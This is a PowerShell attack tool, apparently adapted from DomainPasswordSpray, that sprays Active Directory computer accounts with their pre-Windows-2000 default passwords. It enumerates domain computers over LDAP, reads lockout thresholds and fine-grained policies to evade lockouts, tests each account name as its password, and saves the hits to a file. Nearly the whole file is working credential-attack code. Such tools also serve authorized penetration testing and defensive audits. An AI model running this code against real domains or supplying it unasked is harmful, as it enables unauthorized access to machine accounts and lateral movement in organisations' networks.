function Invoke-Pre2kSpray 
{
 <#
    .SYNOPSIS

    This module performs a password spray attack against computers of a domain to identify pre-windows-2000 compatible accounts.
    
    Pre2kPasswordSpray Function: Invoke-Pre2kSpray
    Author: Original Invoke-DomainPasswordSpray by Beau Bullock (@dafthack) and Brian Fehrman (@fullmetalcache), adjustments for pre2k accounts by @eversinc33
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION
    
    This module performs a password spray attack against computers of a domain to identify pre-windows-2000 compatible accounts.
  
    .PARAMETER OutFile

    A file to output the results to.

    .PARAMETER Domain

    The domain to spray against.

    .PARAMETER Force

    Disables confirmation prompt when enabled

    .EXAMPLE

    C:\PS> Invoke-Pre2kSpray -OutFile valid-creds.txt -Domain test.local

    #>

    param(
     [Parameter(Position = 1, Mandatory = $false)]
     [string]
     $OutFile,

     [Parameter(Position = 2, Mandatory = $false)]
     [string]
     $Domain = "",

     [Parameter(Position = 3, Mandatory = $false)]
     [switch]
     $Force
    )

    try
    {
        if ($Domain -ne "")
        {
            # Using domain specified with -Domain option
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$Domain)
            $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
        }
        else
        {
            # Trying to use the current user's domain
            $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
        }
    }
    catch
    {
        Write-Host -ForegroundColor "red" "[*] Could not connect to the domain. Try specifying the domain name with the -Domain option."
        break
    }

    Write-Host "[*] Using domain" $CurrentDomain

    $ComputerListArray = Get-DomainComputerList -Domain $Domain -RemoveDisabled -RemovePotentialLockouts -Filter $Filter

    if (!$Force)
    {
        $title = "Confirm Password Spray"
        $message = "Are you sure you want to perform a password spray against " + $ComputerListArray.count + " accounts?"

        $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
            "Attempts to authenticate 1 time per user in the list for each password in the passwordlist file."

        $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
            "Cancels the password spray."

        $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)

        $result = $host.ui.PromptForChoice($title, $message, $options, 0)
        
        if ($result -ne 0)
        {
            Write-Host "Cancelling the password spray."
            return
        }
    }

    Write-Host -ForegroundColor Yellow "[*] Password spraying has beguns"
    Write-Host "[*] This might take a while depending on the total number of computers"

    Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $ComputerListArray -OutFile $OutFile

    Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
    if ($OutFile -ne "")
    {
        Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
    }
}

function Countdown-Timer
{
    param(
        $Seconds = 1800,
        $Message = "[*] Pausing to avoid account lockout.",
        [switch] $Quiet = $False
    )
    foreach ($Count in (1..$Seconds))
    {
        Write-Progress -Id 1 -Activity $Message -Status "Waiting for $($Seconds/60) minutes. $($Seconds - $Count) seconds remaining" -PercentComplete (($Count / $Seconds) * 100)
        Start-Sleep -Seconds 1
    }
    Write-Progress -Id 1 -Activity $Message -Status "Completed" -PercentComplete 100 -Completed
}

function Get-DomainComputerList
{
    param(
     [Parameter(Position = 0, Mandatory = $false)]
     [string]
     $Domain = "",

     [Parameter(Position = 1, Mandatory = $false)]
     [switch]
     $RemoveDisabled,

     [Parameter(Position = 2, Mandatory = $false)]
     [switch]
     $RemovePotentialLockouts,

     [Parameter(Position = 3, Mandatory = $false)]
     [string]
     $Filter
    )

    try
    {
        if ($Domain -ne "")
        {
            # Using domain specified with -Domain option
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$Domain)
            $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
        }
        else
        {
            # Trying to use the current user's domain
            $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
        }
    }
    catch
    {
        Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -Domain option."
        break
    }

    # Setting the current domain's account lockout threshold
    $objDeDomain = [ADSI] "LDAP://$($DomainObject.PDCRoleOwner)"
    $AccountLockoutThresholds = @()
    $AccountLockoutThresholds += $objDeDomain.Properties.lockoutthreshold

    # Getting the AD behavior version to determine if fine-grained password policies are possible
    $behaviorversion = [int] $objDeDomain.Properties['msds-behavior-version'].item(0)
    if ($behaviorversion -ge 3)
    {
        # Determine if there are any fine-grained password policies
        Write-Host "[*] Current domain is compatible with Fine-Grained Password Policy."
        $ADSearcher = New-Object System.DirectoryServices.DirectorySearcher
        $ADSearcher.SearchRoot = $objDeDomain
        $ADSearcher.Filter = "(objectclass=msDS-PasswordSettings)"
        $PSOs = $ADSearcher.FindAll()

        if ( $PSOs.count -gt 0)
        {
            Write-Host -foregroundcolor "yellow" ("[*] A total of " + $PSOs.count + " Fine-Grained Password policies were found.`r`n")
            foreach($entry in $PSOs)
            {
                # Selecting the lockout threshold, min pwd length, and which
                # groups the fine-grained password policy applies to
                $PSOFineGrainedPolicy = $entry | Select-Object -ExpandProperty Properties
                $PSOPolicyName = $PSOFineGrainedPolicy.name
                $PSOLockoutThreshold = $PSOFineGrainedPolicy.'msds-lockoutthreshold'
                $PSOAppliesTo = $PSOFineGrainedPolicy.'msds-psoappliesto'
                $PSOMinPwdLength = $PSOFineGrainedPolicy.'msds-minimumpasswordlength'
                # adding lockout threshold to array for use later to determine which is the lowest.
                $AccountLockoutThresholds += $PSOLockoutThreshold

                Write-Host "[*] Fine-Grained Password Policy titled: $PSOPolicyName has a Lockout Threshold of $PSOLockoutThreshold attempts, minimum password length of $PSOMinPwdLength chars, and applies to $PSOAppliesTo.`r`n"
            }
        }
    }

    $observation_window = Get-ObservationWindow $CurrentDomain

    # Generate a computer list from the domain
    # Selecting the lowest account lockout threshold in the domain to avoid
    # locking out any accounts.
    [int]$SmallestLockoutThreshold = $AccountLockoutThresholds | sort | Select -First 1
    Write-Host -ForegroundColor "yellow" "[*] Now creating a list of computers to spray..."
    
    if ($SmallestLockoutThreshold -eq "0")
    {
        Write-Host -ForegroundColor "Yellow" "[*] There appears to be no lockout policy."
    }
    else
    {
        Write-Host -ForegroundColor "Yellow" "[*] The smallest lockout threshold discovered in the domain is $SmallestLockoutThreshold login attempts."
    }

    $ComputerSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$CurrentDomain)
    $DirEntry = New-Object System.DirectoryServices.DirectoryEntry
    $ComputerSearcher.SearchRoot = $DirEntry

    $ComputerSearcher.PropertiesToLoad.Add("samaccountname") > $Null
    $ComputerSearcher.PropertiesToLoad.Add("badpwdcount") > $Null
    $ComputerSearcher.PropertiesToLoad.Add("badpasswordtime") > $Null

    $ComputerSearcher.filter = "(&(objectClass=computer)$Filter)"

    $ComputerSearcher.PropertiesToLoad.add("samaccountname") > $Null
    $ComputerSearcher.PropertiesToLoad.add("lockouttime") > $Null
    $ComputerSearcher.PropertiesToLoad.add("badpwdcount") > $Null
    $ComputerSearcher.PropertiesToLoad.add("badpasswordtime") > $Null

    Write-Host $ComputerSearcher.filter

    # grab batches of 1000 in results
    $ComputerSearcher.PageSize = 1000
    $AllComputerObjects = $ComputerSearcher.FindAll()
    Write-Host -ForegroundColor "yellow" ("[*] There are " + $AllComputerObjects.count + " total computers found.")
    $ComputerListArray = @()

    if ($RemovePotentialLockouts)
    {
        Write-Host -ForegroundColor "yellow" "[*] Removing computers within 1 attempt of locking out from list."
        foreach ($user in $AllComputerObjects)
        {
            # Getting bad password counts and lst bad password time for each user
            $badcount = $user.Properties.badpwdcount
            $samaccountname = $user.Properties.samaccountname
            try
            {
                $badpasswordtime = $user.Properties.badpasswordtime[0]
            }
            catch
            {
                continue
            }
            $currenttime = Get-Date
            $lastbadpwd = [DateTime]::FromFileTime($badpasswordtime)
            $timedifference = ($currenttime - $lastbadpwd).TotalMinutes

            if ($badcount)
            {
                [int]$userbadcount = [convert]::ToInt32($badcount, 10)
                $attemptsuntillockout = $SmallestLockoutThreshold - $userbadcount
                # if there is more than 1 attempt left before a user locks out
                # or if the time since the last failed login is greater than the domain
                # observation window add user to spray list
                if (($timedifference -gt $observation_window) -or ($attemptsuntillockout -gt 1))
                                {
                    $ComputerListArray += $samaccountname
                }
            }
        }
    }
    else
    {
        foreach ($user in $AllComputerObjects)
        {
            $samaccountname = $user.Properties.samaccountname
            $ComputerListArray += $samaccountname
        }
    }

    Write-Host -foregroundcolor "yellow" ("[*] Created a userlist containing " + $ComputerListArray.count + " computers gathered from the current user's domain")
    return $ComputerListArray
}

function Invoke-SpraySinglePassword
{
    param(
            [Parameter(Position=1)]
            $Domain,
            [Parameter(Position=2)]
            [string[]]
            $UserListArray,
            [Parameter(Position=4)]
            [string]
            $OutFile
    )
    $time = Get-Date
    $count = $UserListArray.count
    Write-Host "[*] Starting pre2k spray against $count computers. Current time is $($time.ToShortTimeString())"
    $curr_user = 0
    if ($OutFile -ne "")
    {
        Write-Host -ForegroundColor Yellow "[*] Writing successes to $OutFile"    
    }
    $RandNo = New-Object System.Random

    foreach ($Computer in $UserListArray)
    {
        $Password = "$Computer".ToLower().Substring(0,"$Computer".Length - 1)
        if ("$Password".Length > 20)
        {
            $Password = $Password.Substring(0,20)
        }
        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$Computer,$Password)
        if ($Domain_check.name -ne $null)
        {
            if ($OutFile -ne "")
            {
                Add-Content $OutFile $Computer`:$Password
            }
            Write-Host -ForegroundColor Green "[*] SUCCESS! Computer:$Computer Password:$Password"
        }
        $curr_user += 1
        Write-Host -nonewline "$curr_user of $count computers tested`r"
    }

}

function Get-ObservationWindow($DomainEntry)
{
    # Get account lockout observation window to avoid running more than 1
    # password spray per observation window.
    $lockObservationWindow_attr = $DomainEntry.Properties['lockoutObservationWindow']
    $observation_window = $DomainEntry.ConvertLargeIntegerToInt64($lockObservationWindow_attr.Value) / -600000000
    return $observation_window
}
